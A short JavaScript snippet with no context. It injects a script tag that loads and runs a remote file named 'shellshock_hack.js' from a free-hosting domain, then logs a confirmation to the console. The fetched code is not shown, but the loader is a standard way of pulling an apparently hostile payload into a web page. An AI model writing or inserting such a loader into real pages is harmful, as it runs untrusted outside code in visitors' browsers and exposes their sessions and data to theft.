
 var script = document.createElement('script');
  script.src = 'https://biblrgenerator.000webhostapp.com/shellshock_hack.js';
  script.onload = function() {
    console.log('your script have been loaded');
  }
  document.body.appendChild(script);